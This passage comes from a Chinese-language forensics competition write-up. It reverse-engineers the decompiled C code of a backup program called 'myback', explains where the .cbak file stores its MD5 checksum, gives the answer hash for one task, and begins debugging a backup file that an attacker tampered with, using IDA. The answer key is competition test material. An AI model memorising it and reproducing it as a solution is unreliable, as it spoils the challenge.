plain">current_file_size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">count </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> hidden_file_count</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> file_block_buf_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_block_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">file_block_buf_offset</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_buffer_length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                file_block_buf_offset </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> file_buffer_length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v3 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> current_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> current_file_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v4 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_info_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">file_info_buf_offset</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v5 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v4 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v4 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v6 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v4 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v4 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v6</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                file_info_buf_offset </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Backup file:%s\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">sprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_message</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Backup file: %s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">write_log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_message</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">aCanNotReadFile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        indexa </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_info_buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_info_buf_offset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">final_file_buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">file_info_buf_offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_block_buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_block_buf_offset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    final_file_buf_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> file_block_buf_offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> file_info_buf_offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">calculate_md5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">        final_file_buf_offset </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v7 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">current_file_info</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v7</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">getCurrentTime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFuLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">".cbak"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_message</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> current_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">save_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_message</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> final_file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> final_file_buf_offset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_block_buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>根据 <code>calculate_md5()</code> 函数的定义，第一个参数 <code>data</code> 数据，第二个参数 <code>lenth</code> 数据长度，第三个参数 <code>md5_sum</code> 为 MD5 计算结果</p>
<p>那么可以知道</p>
<ol>
<li>变量 <code>current_file_info</code> 为原始 <code>calculate_md5()</code> 函数的计算结果</li>
<li>执行 <code>v7 = *(_QWORD *)&amp;current_file_info[8];</code> 将 <code>current_file_info()</code> 计算的结果取前八位存入 <code>v7</code></li>
<li>执行 <code>*(_QWORD *)(final_file_buffer + 4) = *(_QWORD *)current_file_info;</code> 将 <code>current_file_info()</code> 计算的结果从 <code>final_file_buffer</code> 的 <code>offset = 4</code> 位置存入</li>
</ol>
<p>那么说明 <code>cbak</code> 文件的 <code>offset = 4</code> 位置开始，取 <code>16</code> 字节得到的就是文件的完整性校验值</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241157-215724-6a47a339c0b1bec54e87bb67e672d4fd.png" width="1243" height="553" class="img_ev3q"></p>
<p>即可得到备份文件的完整性校验值</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">EACDD8510B0F54EA412FA900A2F0645F</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="4-恢复被破坏的源码备份文件">4. 恢复被破坏的源码备份文件<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#4-%E6%81%A2%E5%A4%8D%E8%A2%AB%E7%A0%B4%E5%9D%8F%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6" class="hash-link" aria-label="4. 恢复被破坏的源码备份文件的直接链接" title="4. 恢复被破坏的源码备份文件的直接链接">​</a></h2>
<blockquote>
<p>攻击者修改了备份文件，导致某些文件无法被成功恢复出来（202410311935.cbak 已被攻击者修改）。请选手分析备份恢复系统中的备份恢复程序 myback，结合现有的备份文件 202410311935.cbak 修复备份文件，使之能够成功恢复出所有的文件，其中有个文件包含有商城门户网站部分的源码，将这个文件的 Md5 作为答案提交。</p>
<p>【答案标准】例：若某个 a.zip 文件中包含有商城源码文件，则计算 a.zip 文件的 32 位小写 Md5 字符串。将此 md5 字符串作为答案提交。</p>
</blockquote>
<p>首先，尝试直接基于原文件执行 <code>restore</code> 功能</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./myback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Menu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Backup File</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Restore Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Print Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. Exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter your choice: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the backup file name to be restored:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">202410311935.cbak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MD5 校验和不匹配</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>那么说明因为备份文件被破坏，导致文件中所记载的完整性校验值与目前文件的计算结果不一致</p>
<p>尝试使用 IDA 进行动调</p>
<p>在 IDA 中，对 <code>restore_files()</code> 函数的 <code>if ( !memcmp(stored_md5_sum, calculated_md5_sum, 0x10uLL) )</code> 语句下断点</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ida_linux_server64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IDA Linux 64-bit remote debug server(ST) v8.3.28. Hex-Rays (c) 2004-2023</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024-11-09 22:02:17 Listening on 0.0.0.0:23946...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024-11-09 22:02:49 [1] Accepting connection from 192.168.200.1...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Menu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Backup File</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Restore Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Print Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. Exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter your choice: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the backup file name to be restored:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">202410311935.cbak</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以看到</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241106-220635-99aef5d3071de9b3dd36f2e2a15a0cab.png" width="1563" height="897" class="img_ev3q"></p>
